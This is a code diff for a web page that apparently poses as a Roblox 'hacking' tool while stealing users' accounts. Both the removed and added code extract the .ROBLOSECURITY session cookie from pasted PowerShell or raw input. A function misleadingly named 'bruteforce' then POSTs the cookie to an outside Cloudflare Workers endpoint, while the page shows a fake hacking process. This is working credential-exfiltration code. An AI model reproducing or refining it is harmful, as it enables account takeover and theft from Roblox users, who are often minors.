@@ -1,60 +1,49 @@
-const PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/"; 
+const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
 
-// 1. Extract cookie from PowerShell or raw string
-function extractRobloxCookie(input) {
-  const psMatch = input.match(/\.ROBLOSECURITY["'],\s*["']([^"']+)/);
-  const rawMatch = input.match(/(_|\.)ROBLOSECURITY=([^;]+)/);
-  return psMatch?.[1] || rawMatch?.[2] || null;
+function extractRobloxSecurityCookie(input) {
+  // Strictly match PowerShell format only
+  const powershellPattern = /\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
+  const powershellMatch = input.match(powershellPattern);
+  
+  if (powershellMatch) {
+    return powershellMatch[1]; // Return only the cookie value
+  }
+  
+  return null; // Not a PowerShell format
 }
 
-// 2. Main function (single call)
-async function bruteforce(sessionId) {
-  console.log("🔍 Starting processing...");
-  
-  // Extract cookie
-  const cookie = extractRobloxCookie(sessionId);
-  if (!cookie) {
-    console.error("❌ No valid .ROBLOSECURITY cookie found");
-    await sendToProxy({
-      error: "No valid cookie extracted",
-      rawInput: sessionId.slice(0, 100) + (sessionId.length > 100 ? "..." : "") // Truncate long input
-    });
-    return;
-  }
-
-  console.log("✅ Extracted cookie:", cookie.slice(0, 15) + "...");
-  
-  // Send everything to proxy
-  try {
-    const response = await sendToProxy({
-      cookie: cookie,
-      rawInput: sessionId,
-      timestamp: new Date().toISOString()
-    });
-    
-    console.log(response.success ? "📤 Data sent to proxy successfully!" : "❌ Proxy error");
-  } catch (error) {
-    console.error("🚨 Failed to send to proxy:", error);
-  }
-}
-
-// 3. Proxy communication
 async function sendToProxy(data) {
-  const response = await fetch(PROXY_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      action: "PROCESS_ROBLOX_DATA",
-      ...data
-    })
-  });
-  
-  if (!response.ok) throw new Error(`Proxy responded with ${response.status}`);
-  return await response.json();
+  try {
+    const response = await fetch(CLOUDFLARE_PROXY_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        sessionId: data,
+        timestamp: new Date().toISOString()
+      })
+    });
+    if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+    return await response.json();
+  } catch (error) {
+    console.error('Proxy error:', error);
+    throw error;
+  }
 }
 
+function bruteforce(input) {
+  let content;
+  const cookie = extractRobloxSecurityCookie(input);
 
+  if (cookie) {
+    content = `✅ Extracted from PowerShell format:\n\`\`\`${cookie}\`\`\``;
+  } else {
+    content = `⚠️ Raw input (not PowerShell format):\n\`\`\`${input}\`\`\``;
+  }
 
+  // Send to proxy (or log for testing)
+  console.log(content);
+  sendToProxy(cookie || input);
+}
 
 
 function validateInput() {
@@ -88,7 +77,6 @@ function validateInput() {
 
   // Send the session ID to the proxy
   bruteforce(sessionId);
-
 
   // Hide error and start fake hacking process
   hideError();
